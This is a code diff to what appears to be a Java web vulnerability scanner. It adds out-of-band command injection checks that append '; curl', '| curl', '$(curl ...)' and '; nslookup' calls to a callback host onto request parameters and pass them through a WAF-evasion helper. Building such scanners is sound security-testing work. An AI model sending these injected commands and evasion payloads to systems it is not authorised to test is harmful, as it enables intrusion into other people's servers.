@@ -7,6 +7,8 @@ import gg.effront.anarcry.model.KnowledgeBase;
 import gg.effront.anarcry.model.Severity;
 import gg.effront.anarcry.scanner.ScanContext;
 import gg.effront.anarcry.scanner.Scanner;
+import gg.effront.anarcry.scanner.oast.OastCorrelator;
+import gg.effront.anarcry.scanner.oast.OastPayload;
 import gg.effront.anarcry.scanner.util.Http;
 import gg.effront.anarcry.scanner.util.CircuitBreakerException;
 import gg.effront.anarcry.scanner.util.HttpClientFactory;
@@ -190,6 +192,9 @@ public class CommandInjectionModule implements Scanner {
                         }
                     }
 
+                    // -- Phase 1b: OOB command injection via OAST callback --
+                    injectOobCmd(ctx, hc, base, path, param, log);
+
                     // -- Phase 2: Time-based blind injection --
                     if (cancel.get() || skipTimeBased) {
                         return local;
@@ -272,6 +277,62 @@ public class CommandInjectionModule implements Scanner {
             }
         }
         return List.copyOf(merged);
+    }
+
+    /**
+     * Inject OOB command injection payloads via OAST callback. Uses curl and
+     * nslookup to trigger HTTP/DNS callbacks that confirm command execution even
+     * when output is not reflected.
+     *
+     * <p>
+     * Payloads injected:
+     *
+     * <ul>
+     * <li>{@code ; curl http://<callback>/<id>} -- HTTP callback via curl
+     * <li>{@code | curl http://<callback>/<id>} -- pipe variant
+     * <li>{@code $(curl http://<callback>/<id>)} -- subshell variant
+     * <li>{@code ; nslookup <id>.<callback-host>} -- DNS callback via nslookup
+     * </ul>
+     */
+    private void injectOobCmd(ScanContext ctx, HttpClient hc, String base, String path, String param,
+            Consumer<String> log) {
+        OastCorrelator oast = ctx.oastCorrelator();
+        if (oast == null || oast.callbackBaseUrl().isEmpty()) {
+            return;
+        }
+        String cbBase = oast.callbackBaseUrl();
+        // Extract host:port for DNS-based payloads
+        String cbHost = cbBase.replaceFirst("^https?://", "").replaceFirst("/.*$", "");
+
+        // curl-based callbacks (HTTP)
+        String[] separators = {"; ", "| ", "$("};
+        String[] suffixes = {"", "", ")"};
+        for (int i = 0; i < separators.length; i++) {
+            String payloadId = OastCorrelator.generatePayloadId();
+            String curlUrl = oast.callbackUrl(payloadId);
+            String payload = "testvalue" + separators[i] + "curl " + curlUrl + suffixes[i];
+            injectSingleOob(ctx, hc, oast, base, path, param, payloadId, payload, "curl-" + i, log);
+        }
+
+        // nslookup-based callback (DNS)
+        String dnsId = OastCorrelator.generatePayloadId();
+        String dnsPayload = "testvalue; nslookup " + dnsId + "." + cbHost;
+        injectSingleOob(ctx, hc, oast, base, path, param, dnsId, dnsPayload, "nslookup", log);
+    }
+
+    private void injectSingleOob(ScanContext ctx, HttpClient hc, OastCorrelator oast, String base, String path,
+            String param, String payloadId, String payload, String label, Consumer<String> log) {
+        try {
+            oast.registerPayload(
+                    new OastPayload(payloadId, id(), path + "?" + param, param, payload, System.currentTimeMillis()));
+            String encoded = URLEncoder.encode(WafEvasion.evasionPayload(ctx, payload), "UTF-8");
+            String url = base + path + "?" + param + "=" + encoded;
+            HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url)).timeout(Duration.ofSeconds(8)).GET()
+                    .build();
+            Http.send(ctx, hc, req, HttpResponse.BodyHandlers.discarding(), id());
+        } catch (Exception e) {
+            // OOB injection errors are non-fatal
+        }
     }
 
     /**
